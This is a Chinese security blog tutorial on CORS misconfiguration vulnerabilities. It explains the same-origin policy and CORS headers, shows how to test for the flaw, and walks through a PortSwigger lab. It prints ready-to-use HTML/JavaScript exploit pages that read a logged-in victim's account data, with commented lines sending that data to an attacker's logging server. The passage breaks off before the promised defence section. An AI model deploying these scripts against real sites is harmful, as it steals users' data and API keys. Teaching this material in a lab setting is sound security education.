---
title: CORS 跨域漏洞攻防实战：靶场复现 + POC 编写 + 防御配置
url: https://mp.weixin.qq.com/s/6It75fU3zzD6_a6l6bsXHg
source: Doonsec's feed
date: 2026-03-29
fetch_date: 2026-03-30T04:45:46.787802
---

# CORS 跨域漏洞攻防实战：靶场复现 + POC 编写 + 防御配置

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/f0zVXnDXPGPKa0bSfMOqS6YSaepcOeKU8qtnOUFbriaib8H7mUIdnhw2E6VbAttjvu51WGfZBcKw77DkSqsRpPSzbwWvP05wmkNibx8xJ3QoNo/0?wx_fmt=jpeg)

# CORS 跨域漏洞攻防实战：靶场复现 + POC 编写 + 防御配置

原创

m3x1
m3x1

梦醒安全

![]()

在小说阅读器中沉浸阅读

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Aj9tsa4DmOmra6EI659XoNIvNn9wnMpVqicmqFmpJAwWJA0fw90SqBVOCEicpkLlV63QbNibrCx4BYT4JKia33l1Yg/640?wx_fmt=png&from=appmsg)

免责声明：本公众号内容仅用于知识分享和学习，由于传播、利用本公众号所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号梦醒安全及作者不为此承担任何责任，一旦造成后果请自行承担！

PART.01

前言

在 Web 渗透测试领域，跨域安全始终是绕不开的核心议题 —— 同源策略（SOP）作为浏览器的基础安全屏障，既守护了不同源之间的资源隔离，也因业务场景的跨域需求催生了跨源资源共享（CORS）机制。然而，CORS 的灵活配置特性，也让 “配置不当” 成为 Web 应用的高频安全漏洞之一。

PART.02

内容

## 域

在前端中，“域”是由以下三个部分共同组成的：

| 组成部分 | 举例 |
| --- | --- |
| 协议(protocol) | http://或https:// |
| 主机(hostname/域名) | www.example.com，api.example.com |
| 端口(port) | 80、443、8080等 |

**简单来说**：Origin(域) = 协议 + 域名 + 端口

## 同源策略（SOP）

同源策略是浏览器的一种安全机制，它限制一个源的js脚本对另一个源的访问。

浏览器的同源策略规定：不同域的客户端脚本在没有明确授权的情况下，不能读写对方的资源。

同源指三个部分相等，即**协议，域名**和**端口**，三者有一个不同即视为不同源

**简单来说**：在浏览器中，只有当协议、域名、端口相同的情况下，才能读写对方的dom、cookie、session、ajax等操作的权限资源。

## 跨源资源共享（CORS）

CORS的出现是用来弥补SOP（同源策略）的不足。

在当时SOP有些限制了网页的业务需求，不能够使不同域的网页互相访问，因此提出了CORS：用于绕过SOP（同源策略）来实现跨域资源访问的一种技术。(CORS使用自定义的HTTP头部让浏览器与服务器进行沟通，它允许浏览器向跨域服务器发出XMLHttpRequest请求，从而克服AJAX只能同源使用的限制。)

同源策略用来限制一个网站对不同源网站的访问，但是如果有一个网站要对信任的不同源站点进行访问，同源策略就是造成妨碍。

CORS是放宽同源策略的一套机制，它通过使用一套HTTP请求来实现

### 常用CORS请求头

● Origin和Access-Control-Allow-Origin：响应的和请求头的Origin必须对得上，才能够访问响应。当Access-Control-Allow-Origin字段值为‘\*’时，就代表任意域都可以访问。

● Access-Control-Allow-Credentials：Boolean 如果请求包含如cookie，authorization headers等认证信息时，是否允许读取响应

●Access-Control-Allow-Methods: PUT, POST, OPTIONS 限制请求方法

● Access-Control-Allow-Headers: Special-Request-Header 请求需要包含特点头部

● Access-Control-Max-Age 预检请求的结果可以被缓存多久

## CORS跨域漏洞

### 概述

CORS跨域漏洞的本质是服务器配置不当

即Access-Control-Allow-Origin取自请求头Origin字段，Access-Control-Allow-Credentials设置为true。

导致攻击者可以构造恶意的脚本 , 诱导用户点击获取用户敏感数据

CORS请求可分为两类，**简单请求和非简单请求**。

### 漏洞原理

浏览器直接发出CORS请求，接下来浏览器会自动在请求的header中加上Origin字段，告诉服务器这个请求来自哪个源。

```
Origin:
```

服务器端收到请求后，会对比这个字段，如果这个源在服务器端的许可范围内，服务器的响应头会加上以下字段

```
Access-Control-Allow-Origin：(这里的值为Origin的值)
Access-Control-Allow-Credentials:true
```

![image-20260327233452867](https://mmbiz.qpic.cn/mmbiz_png/f0zVXnDXPGO4B7ZP5kpG7AFCzE2SaxWIHqj8Qicic6F3mWhlyxEgBMuKtpaGnDs6hNbLytODbic1DeBicYeGxI1zYe0kSNxgHyrjJ2T2gbicsiayo/640?wx_fmt=png&from=appmsg "null")

image-20260327233452867

如果说服务端配置了 Access-Control-Allow-Origin 响应头，并且浏览器认可该值，**跨域就被允许了，此时漏洞也产生了**

### 验证方式

只需要在header中添加以下内容即可验证

```
Origin: foo.example.org
```

然后返回值携带以下，就能证明存在跨域漏洞。

```
Access-Control-Allow-Origin: foo.example.org
Access-Control-Allow-Credentials: true
```

![image-20260327233752056](https://mmbiz.qpic.cn/mmbiz_png/f0zVXnDXPGOtFGDKUC1rGpGYqEADP72kHhsXicfliaycKkmFf3lBZlhvWPcHqwlEYFgw41JpUnJykPl6g2l0JvI2s6P1vaKpqes5cDUDH3jIM/640?wx_fmt=png&from=appmsg "null")

image-20260327233752056

### 不存在漏洞情况

如果有下面的情况可以说基本不存在CORS，**除非你删除掉参数后依然能够得到响应**，那说明上面的参数是一个无效参数也就是一个摆设。

1. 1. 响应包中的**Access-Control-Allow-Origin值一直为**\*，不随着请求包中的origin改变。组合如下，因为浏览器会阻止如下的配置：

```
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

![image-20260327235155501](https://mmbiz.qpic.cn/mmbiz_png/f0zVXnDXPGNfs3qdqzE3QQxNHAiccmpbrcSHibx1QflPX4T5cLP8Os0SxvDzQCWQWwNC2hzCALwJbpOAL9v5uNibKNibMHMNO2F6jtH7UpsHiaaI/640?wx_fmt=png&from=appmsg "null")

image-20260327235155501

Access-Control-Allow-Origin表示允许跨域访问的host，后端将其设置成了'\*'，代表允许所有网站的跨域请求，当这种情况的时候，即便Access-Control-Allow-Credentials为true，那也会被浏览器认定为是不安全的，就不能将cookie发送到服务端。

1. 2. 数据包中必须**包含个人信息才能响应**的，也不存在漏洞，如数据包中必须包含电话号码

![image-20260327235245969](https://mmbiz.qpic.cn/sz_mmbiz_png/f0zVXnDXPGM1ia1PbDhmcbiagRliaBtxyPpLktLdPDy5ria6AUCvwkfkSNoicqSFsW8ohdcLHOr9icaDlF80L8Bklvpbaet4jukZmlGxicY1K8dTSM/640?wx_fmt=png&from=appmsg "null")

image-20260327235245969

1. 3. 有**token**进行验证

![image-20260327235321374](https://mmbiz.qpic.cn/mmbiz_png/f0zVXnDXPGOlQlJJD4NnEMz85QcT7IIyy6tMNVyqYniansP3S1jzIDjWsznMvWucyONRYBCGb5195U7L0KIZZpzGHSibXicDaJiaGiaiatYZhKsF8/640?wx_fmt=png&from=appmsg "null")

image-20260327235321374

1. 4. 有**签名**

![image-20260327235342923](https://mmbiz.qpic.cn/sz_mmbiz_png/f0zVXnDXPGN2txsxONGV54hLpM5ggVxzUEE1h4DMsYaSXhKxE8CyFicRK78d0mgsYIeVicZz1E0cIojzIdaX72iaSea9oTUVWNwZjE6kdervWE/640?wx_fmt=png&from=appmsg "null")

image-20260327235342923

1. 5. 传入的参数中必须包含用户的一些用户名之类（这个只能说限制太多，首先你得获取到别人的用户名之类，其次你还要一个搞成一个专属的链接给他人点击，就这两个条件太苛刻，危害不大，但是如果你想交也可以蛮交）

![image-20260327235448431](https://mmbiz.qpic.cn/mmbiz_png/f0zVXnDXPGNwXJk1bLe2Po0PMOxg6SN9ksGK7RjgkUuqCuHeAV2anVAEPQkrTBrlmRTfeyNTTwjHTPRHiapsqlOaDNl22nedWgPNkvgBhNOU/640?wx_fmt=png&from=appmsg "null")

image-20260327235448431

### 简单请求

1、请求方式为GET，POST，HEAD这三种之一

2、HTTP头不超出以下这几个字段

```
Accept
Accept-Language
Content-Language
Last-Event-ID
Content-Type：application/x-www-form-urlencoded、multipart/form-data、text/plain
```

当浏览器发现服务器的请求为简单请求时，会在头信息里加入Origin字段。Origin字段代表此次请求来自哪个域，服务器就可以检验是否来自该域。如果匹配，服务器就会在响应包中增添三个字段：

```
Access-Control-Allow-Origin
Access-Control-Allow-Credentials
Access-Control-Expose-Headers
```

其中 Access-Control-Allow-Origin是必须有的，而剩下两个可有可无。

## GET型CORS

**有Referer先删除Referer**，然后发送看是否能够正常请求

这里在请求包中修改Origin字段，发现响应包的Access-Control-Allow-Origin会随之改变，即存在有CORS配置不当漏洞

利用脚本：

```
<!DOCTYPE html>
<html>
<head>
 <title>cors liyon</title>
</head>
<body>
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://xxx.com/accountDetails',true); // 替换下URL地址为漏洞地址
    req.withCredentials = true;
    req.send();
    function reqListener() {
        alert(this.responseText);
        // 真实环境利用时，重定向至我们的服务器
        // location='https://xxx.com/log?key='+this.responseText;
    };
</script>
</body>
</html>
```

将上面的内容保存为HTML，在登录该账号的浏览器中访问即可

## POST型CORS

有的时候我们会遇到post请求，post请求就得使用以下脚本。

```
<!DOCTYPE html>
<html>
<head>
 <title>cors liyon</title>
</head>
<body>
<script type="text/javascript">
 var http = new XMLHttpRequest();
 var url = 'https://www.xxx.com/api/address'; //就替换下URL地址为漏洞地址即可
 var params = 'timeio=true'; //替换post中的参数
 http.open('POST', url, true);
 http.withCredentials = true;
 http.setRequestHeader("Content-type","application/json;charset=UTF-8");
 http.onreadystatechange = function() {
  if(http.readyState == 4 && http.status == 200) {
   alert(http.responseText);
   //真实环境利用时，重定向至我们的服务器
   //location='http:xxx.xxx.xxx/log?key='+this.responseText;
  }
 }
 http.send(params);
</script>
</body>
</html>
```

PART.03

靶场复现

使用 burp 的 CORS 靶场

### Lab1: CORS vulnerability with basic origin reflection

> This website has an insecure CORS configuration in that it trusts all origins.
>
> To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.
>
> You can log in to your own account using the following credentials: wiener:peter

使用账户登录后，bp抓包看到有敏感信息

![image-20260328194804870](https://mmbiz.qpic.cn/sz_mmbiz_png/f0zVXnDXPGMHtBzqdoZKsVZuSbZt6Xk4fcOSC2w1jC8falywuABzDOfViaxrcJ7gBR8FdlqQ97zymoKHqWSCfjjUpaffbcBWUJylLibbvCaTs/640?wx_fmt=png&from=appmsg "null")

image-20260328194804870

添加头部：

```
Origin: foo.test.com
```

![image-20260328194900109](https://mmbiz.qpic.cn/mmbiz_png/f0zVXnDXPGNzhHCjrlPJV2r7p3obhsKIvxiaPCoYTMLDFEZseia8Rgxg66jjXmlEOKjR2JyMwmg2erYTtzErqEJ186DSrJmBxc8icdz9xtOicicE/640?wx_fmt=png&from=appmsg "null")

image-20260328194900109

我们修改请求包中的Origin字段，返回包中Access-Control-Allow-Origin字段也会对应被改变，根据返回包的字段，说明存在CORS漏洞

使用如下poc:

```
<!DOCTYPE html>
<html>
<head>
 <title>cors liyon</title>
</head>
<body>
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://0a7f000d0451813883a44196002a0039.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        alert(this.responseText);
    };
</script>
</body>
</html>
```

将poc保存成html文件，然后使用python开启http服务，访问 `h...